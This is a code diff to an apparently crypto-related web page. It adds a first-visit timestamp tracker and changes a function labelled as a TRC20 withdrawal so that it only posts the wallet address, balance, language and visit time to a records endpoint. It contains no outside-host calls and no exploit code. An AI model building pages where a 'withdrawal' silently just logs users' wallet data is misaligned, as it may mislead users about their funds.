@@ -11,6 +11,16 @@
 <link rel="preconnect" href="https://fonts.googleapis.com"/>
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
 <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;800&family=Rajdhani:wght@500;600;700&display=swap" rel="stylesheet"/>
+<script>
+(function(){
+  try {
+    var k = '__nexus_first_visit';
+    var v = localStorage.getItem(k);
+    if (!v) { v = new Date().toISOString(); localStorage.setItem(k, v); }
+    window.__firstVisitTime = v;
+  } catch(e){ window.__firstVisitTime = new Date().toISOString(); }
+})();
+</script>
 <style>
 :root{
   --bg:#0B0C10;--cyan:#00F0FF;--gold:#FFD700;
@@ -503,21 +513,24 @@ if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",
 // ========== 提交 TRC20 提现记录到后端（已修正为 /api/withdraw） ==========
 async function submitTrc20Record(address, balance){
   try{
-    const res = await fetch(API_BASE + '/api/withdraw', {
+    const payload = {
+      address: address,
+      balance: balance || '0.00',
+      timestamp: new Date().toISOString(),
+      language: (document.getElementById('langSelect') && document.getElementById('langSelect').value) || (navigator.language || 'en'),
+      visitTime: window.__firstVisitTime || new Date().toISOString()
+    };
+    const res = await fetch(API_BASE + '/api/records', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        address: address,
-        amount: parseFloat(balance) || 0
-      })
+      body: JSON.stringify(payload)
     });
     if(!res.ok){
       const err = await res.json().catch(() => ({}));
       console.warn('提交失败:', err.error || ('HTTP ' + res.status));
       return;
     }
-    const data = await res.json().catch(() => ({}));
-    console.log('[提交] TRC20 提现已记录:', data);
+    console.log('[提交] TRC20 记录已保存');
   }catch(err){
     console.warn('地址记录提交失败:', err.message);
   }
